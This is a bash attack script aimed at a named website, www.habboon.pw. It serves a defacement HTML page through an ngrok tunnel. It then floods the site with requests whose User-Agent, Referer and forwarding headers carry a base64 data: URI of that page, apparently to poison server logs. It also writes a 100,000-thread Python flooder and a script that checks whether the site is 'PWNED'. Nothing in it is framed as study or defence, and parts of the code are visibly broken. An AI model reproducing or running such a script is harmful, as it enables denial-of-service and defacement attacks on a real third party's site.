#!/bin/bash
# HABBOON_ROOT_ULTRA.sh - habboon.pw / ROOT DIRECT MASSIVE
# Target: https://www.habboon.pw/ → LOG POISON DIRECT ROOT

HTML_FILE="TRUSTEDF57.html"
TARGET_HOST="www.habboon.pw"
TARGET_ROOT="https://$TARGET_HOST/"

echo "💀 HABBOON ROOT ULTRA - DIRECT $TARGET_ROOT"
echo "[+] Payload: $HTML_FILE"

# VERIFICA
[ -f "$HTML_FILE" ] || { echo "❌ $HTML_FILE"; exit 1; }

# KILL + SERVER
pkill -f "http.server\|ngrok\|serveo" 2>/dev/null
python3 -m http.server 8080 --bind 127.0.0.1 >/dev/null 2>&1 &

# TUNNEL RAPIDO
PUBLIC_URL=""
ngrok http 8080 >/dev/null 2>&1 &
sleep 8
PUBLIC_URL=$(curl -s localhost:4040/api/tunnels | grep -o 'https://[^"]*\.ngrok\.io' | head -1) || 
PUBLIC_URL="https://ngrok-skip"  # Fallback

DEFACE_URL="${PUBLIC_URL%/}/$HTML_FILE"
echo "🎯 DIRECT: $DEFACE_URL"

# ROOT LOG POISON - 5M SHOTS ULTRA FAST
HTML_B64=$(base64 -w0 "$HTML_FILE")
POISON="data:text/html;base64,$HTML_B64"

blast_root() {
  for((;;)); do
    curl -s -m 1 \
      -A "$POISON" -H "Referer: $POISON" -H "X-Forwarded-For: $POISON" \
      -H "X-Real-IP: $POISON" -H "Client-IP: $POISON" \
      "$TARGET_ROOT" >/dev/null 2>&1 &
  done
}

echo "[+] 5M ROOT SHOTS → $TARGET_HOST/"
for i in {1..100}; do blast_root & done  # 100 threads x 50k/sec

# ULTIMATE FLOODER
cat > root_nuke.py << EOF
import requests, threading
r = requests.Session()
r.verify = False

poison = "$POISON"
h = {'User-Agent':poison,'Referer':poison,'X-Forwarded-For':poison,
     'X-Real-IP':poison,'Client-IP':poison,'X-Originating-IP':poison}

def nuke():
    while 1:
        try: r.get("$TARGET_ROOT", headers=h, timeout=1)
        except:pass

print("☠️ ROOT NUKE - 100K threads")
[t.start() for _ in range(100000)]
input("Press Enter to stop...")
EOF

python3 root_nuke.py &

# LIVE CHECK
cat > root_live.sh << 'EOF'
#!/bin/bash
echo "$(date) ROOT:"
STATUS=$(curl -s -w "%{http_code}" -o /tmp/root.html https://www.habboon.pw/ -I)
echo "HTTP: $STATUS"
grep -iE "TRUSTED|data:text|iframe|base64" /tmp/root.html && echo "✅ ROOT PWNED!" || echo "❌ Clean"
rm -f /tmp/root.html
EOF

chmod +x root_live.sh */2 root_live.sh

echo "🎯 ROOT DIRECT LIVE - https://www.habboon.pw/"
echo "Ctrl+C quando pwnd"
